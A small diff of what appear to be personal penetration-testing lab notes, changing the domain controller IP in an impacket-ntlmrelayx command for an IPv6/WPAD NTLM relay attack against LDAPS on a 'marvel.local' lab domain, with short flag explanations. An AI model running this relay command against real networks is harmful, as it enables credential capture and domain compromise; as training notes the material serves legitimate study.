@@ -13,7 +13,7 @@
 
 - Start `impacket-ntlmrelayx` as:
 	- Needs `DC` IP
-	- `impacket-ntlmrelayx -6 -t ldaps://10.0.8.4 -wh fakewpad.marvel.local -l lootme`
+	- `impacket-ntlmrelayx -6 -t ldaps://10.0.1.4 -wh fakewpad.marvel.local -l lootme`
 		- `6` -> IPv6
 		- `-t` -> target
 		- `-wh` -> wpad
